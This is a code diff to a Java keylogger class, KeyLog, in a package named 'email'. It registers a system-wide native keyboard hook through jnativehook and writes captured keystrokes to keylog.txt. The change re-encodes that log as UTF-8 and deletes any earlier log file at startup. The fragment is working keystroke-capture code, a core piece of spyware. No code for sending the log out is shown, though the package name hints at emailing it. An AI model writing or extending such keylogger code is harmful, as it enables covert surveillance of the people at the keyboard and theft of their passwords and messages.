@@ -1,8 +1,12 @@
 package email;
 
 import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.io.OutputStreamWriter;
+import java.nio.charset.Charset;
 import java.util.logging.Logger;
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
@@ -16,7 +20,17 @@ public class KeyLog implements NativeKeyListener {
 
   public KeyLog() {
     try {
-      writer = new BufferedWriter(new FileWriter("keylog.txt", true));
+      File file = new File("keylog.txt");
+      if (file.exists()) {
+        file.delete();
+      }
+
+      writer = new BufferedWriter(
+        new OutputStreamWriter(
+          new FileOutputStream("keylog.txt", true),
+          Charset.forName("UTF-8")
+        )
+      );
     } catch (IOException ex) {
       ex.printStackTrace();
     }
@@ -25,7 +39,12 @@ public class KeyLog implements NativeKeyListener {
   public void start() {
     try {
       isLoging = true;
-      writer = new BufferedWriter(new FileWriter("keylog.txt", true));
+      writer = new BufferedWriter(
+        new OutputStreamWriter(
+          new FileOutputStream("keylog.txt", true),
+          Charset.forName("UTF-8")
+        )
+      );
       GlobalScreen.registerNativeHook();
       GlobalScreen.addNativeKeyListener(this);
       Logger logger = Logger.getLogger(
